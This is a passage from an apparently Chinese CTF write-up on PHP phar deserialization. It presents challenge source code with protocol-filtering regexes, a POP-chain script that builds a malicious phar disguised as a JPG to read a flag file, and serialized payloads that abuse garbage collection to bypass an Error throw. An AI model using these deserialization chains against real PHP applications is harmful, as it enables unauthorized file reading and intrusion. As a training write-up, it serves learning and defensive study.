class-name\">C1e4r</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">test</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">str</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">test</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//$this-&gt;source = phar://phar.jpg</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">str</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">_show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|file:|gopher|dict|\\.\\.|f1ag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/http|https|file:|gopher|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker~\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$params</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">params</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">params</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">params</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">file_get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">file_get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$text</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p>在class.php中</p>\n<pre><code class=\"prism language-php\"> <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">_show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|file:|gopher|dict|\\.\\.|f1ag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span>\n</code></pre>\n<p>对传入的file参数进行了过滤。本来想直接通过绕过preg_match来读取f1ag.php文件。</p>\n<p>但是本题的考点是<code>phar反序列化</code></p>\n<p>继续看，在class.php的Test类中</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">file_get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$text</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre>\n<p>我们可以利用file_get_contents</p>\n<p>思路：我们首先生成一个phar文件，其中meta值里面是对class.php的序列化值，然后上传，获取文件的路径和文件名。然后，通过file参数访问该文件，file参数会经过<code>file_exists()</code>，直接触发phar进行反序列化，触发漏洞。</p>\n<p>构造class.php的pop链。</p>\n<p>我们可以得到利用链：C1e4r::__destruct()的</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">test</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>中的<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        t\n       \n       \n        h\n       \n       \n        i\n       \n       \n        s\n       \n       \n        −\n       \n       \n        &gt;\n       \n       \n        t\n       \n       \n        e\n       \n       \n        s\n       \n       \n        t\n       \n       \n        被\n       \n       \n        当\n       \n       \n        作\n       \n       \n        字\n       \n       \n        符\n       \n       \n        串\n       \n       \n        ，\n       \n       \n        此\n       \n       \n        时\n       \n       \n        当\n       \n      \n      \n       this-&gt;test被当作字符串，此时当\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.77777em; vertical-align: -0.08333em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.61508em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord cjk_fallback\">被</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">作</span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">串</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">此</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">当</span></span></span></span></span>this-&gt;test=Show类时，调用Show::__toString()函数。设置</p>\n<pre><code class=\"prism language-php\"><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">str</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>Test类\n</code></pre>\n<p>因此</p>\n<pre><code>$this-&gt;str['str']-&gt;source=Test类-&gt;source\n</code></pre>\n<p>此时Test类调用不存在的属性source，此时就会调用Test::__get函数并执行</p>\n<pre><code>$this-&gt;get(source)\n</code></pre>\n<p>接着到Test::get函数里面执行</p>\n<pre><code>$value = $this-&gt;params[\"source\"];\n</code></pre>\n<p>设置</p>\n<pre><code>$this-&gt;params[\"source\"]=\"/var/www/html/f1ag.php\"\n</code></pre>\n<p>然后执行</p>\n<pre><code>$this-&gt;file_get(\"/var/www/html/f1ag.php\")\n</code></pre>\n<p>最后返回</p>\n<pre><code>base64_encode(file_get_contents(\"/var/www/html/f1ag.php\"));\n</code></pre>\n<p>解码就可以得到flag了。</p>\n<p>pop链</p>\n<pre><code>&lt;?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n}\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n}\n\n$c1e4r = new C1e4r();\n$show = new Show();\n$test = new Test();\n$test-&gt;params['source'] = \"/var/www/html/f1ag.php\";\n$c1e4r-&gt;str = $show;   //利用  $this-&gt;test = $this-&gt;str; echo $this-&gt;test;\n$show-&gt;str['str'] = $test;  //利用 $this-&gt;str['str']-&gt;source;\n\n$phar = new Phar(\"exp.phar\"); //.phar文件\n$phar-&gt;startBuffering();\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); //固定的\n$phar-&gt;setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象，将自定义的meta-data存入manifest\n$phar-&gt;addFromString(\"exp.txt\", \"test\"); //随便写点什么生成个签名，添加要压缩的文件\n$phar-&gt;stopBuffering();\n?&gt;\n</code></pre>\n<p>得到phar文件，修改后缀为jpg，上传。</p>\n<p>得到文件名的两种方法</p>\n<p>方法1：</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">function</span> <span class=\"token function\">upload_file_do</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".jpg\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//mkdir(\"upload\",0777);</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>文件名是<code>$filename = md5($_FILES[\"file\"][\"name\"] . $_SERVER[\"REMOTE_ADDR\"]) . \".jpg\";</code></p>\n<p>路径是url+/upload/文件名</p>\n<p>(但是这种方法感觉不对,得不出flag,个人做的时候出现问题了)</p>\n<p>方法2:</p>\n<p>直接访问,URL+/upload/可以查看文件名</p>\n<p>最后直接</p>\n<pre><code>file=phar://upload/文件名,就可以得到flag\n</code></pre>\n<h3><a id=\"NSSCTFprize_p1_531\"></a>[NSSCTF]prize_p1</h3>\n<p>考点:</p>\n<blockquote>\n<ol><li>phar反序列化</li><li>绕过Error异常</li><li>phar签名修改</li><li>GC进制(垃圾回收系统)</li></ol>\n</blockquote>\n<p>wp:</p>\n<p>打开,直接审计代码</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token constant\">META</span> http<span class=\"token operator\">-</span>equiv<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Content-Type\"</span> content<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text/html; charset=utf-8\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">getflag</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"FLAG\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我知道你想干吗，我的建议是不要那样做。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./tmp/a.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我知道你想干吗，我的建议是不要那样做。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我知道你想干吗，我的建议是不要那样做。\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"那么就从这里开始起航吧\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n</code></pre>\n<p>分析代码，其中<code>getflag</code>的<code>__destruct</code>方法触发即可得到flag，<code>A</code>的<code>__destruct</code>方法触发即可写<code>/tmp/a.txt</code>或者任意文件读。</p>\n<h4><a id=\"PHP_582\"></a>PHP对象</h4>\n<p><code>__destruct</code>是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发<code>__destruct</code></p>\n<ol><li>主动调用<code>unset($obj)</code></li><li>主动调用<code>$obj = NULL</code></li><li>程序自动结束</li></ol>\n<p>除此之外，PHP还拥有垃圾回收<code>Garbage collection</code>即我们常说的<code>GC</code>机制。</p>\n<p>PHP中<code>GC</code>使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被<code>GC</code>机制自动回收掉，回收过程中，就会调用函数的<code>__destruct</code>。</p>\n<p>刚才我们提到了引用计数，其实当一个对象没有任何引用的时候，则会被视为“垃圾”，即</p>\n<pre><code>$a = new show();\n</code></pre>\n<p>这是一个<code>show</code>对象，被<code>a</code>变量应用，所以它不是“垃圾”。如果是</p>\n<pre><code>new show();\n</code></pre>\n<p>或</p>\n<pre><code>$a = new show();$a = 2;\n</code></pre>\n<p>上面都是对象没有被饮用或开始有引用之后失去了引用的情况，我们可以考虑下列实例代码。</p>\n<pre><code>&lt;?php\nclass show{\nfunction __construct($i) {$this-&gt;i = $i; }\nfunction __destruct() { echo $this-&gt;i.\"Destroy...\\n\"; }\n}\nnew show('1');\n$a = new show('2');\n$a = new show('3');\necho \"————————————\\n\";\n</code></pre>\n<p>输出:</p>\n<pre><code>1Destroy...\n2Destroy...\n————————————\n3Destroy...\n</code></pre>\n<p>这儿是当<code>a</code>第二次赋值时,<code>show('2')</code>执行<code>__destruct</code>,然后执行<code>echo</code>,当程序完了后执行<code>show('3')</code>的<code>__destruct</code></p>\n<h4><a id=\"_637\"></a>绕过异常</h4>\n<p>看到有个<code>unserialize</code>函数可以进行反序列化，同时会发现这里反序列化是没有任何引用的，所以按照上述会在执行完毕之后处于<code>unset</code>状态，会回收这个对象，即执行<code>__destruct</code>这样的话，这样就绕过<code>error</code>,就可以进入A类中写入数据。</p>\n<pre><code>O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}\n</code></pre>\n<h4><a id=\"phar_645\"></a>phar://反序列化</h4>\n<p>正则表达式过滤了伪协议，若直接phar反序列化，那么反序列化对象中依旧会有明文。</p>\n<pre><code>https://guokeya.github.io/post/uxwHLckwx\n</code></pre>\n<p>有五种能触发phar的操作，我们通过将phar文件压缩为另一种文件格式，这样反序列化依旧能够触发并且数据中不会出现明文从而绕过正则表达式</p>\n<blockquote>\n<p>普通phar<br/> gzip<br/> bzip2<br/> tar<br/> zip</p>\n</blockquote>\n<h4><a id=\"getflag_661\"></a>处理getflag()类</h4>\n<p>如果我们直接在phar文件的Metadata写<code>getflag</code>对象的话，是不能进行反序列化的，因为它反序列化之后会被phar对象的metadata属性引用，不符合unset情况，也就不会直接执行<code>__destruct</code></p>\n<p>我们利用GC机制去执行<code>__destruct</code></p>\n<pre><code>a:2:{i:0;O:7:\"getflag\":{}i:0;N;}\n</code></pre>\n<p>考虑反序列化本字符串，因为<strong>反序列化的过程是顺序执行</strong>的，所以到第一个属性时，会将<code>Array[0]</code>设置为<code>getflag</code>对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>getflag</code>对象便丢失了引用，就会被GC所捕获，就可以执行<code>__destruct</code>了。</p>\n<h4><a 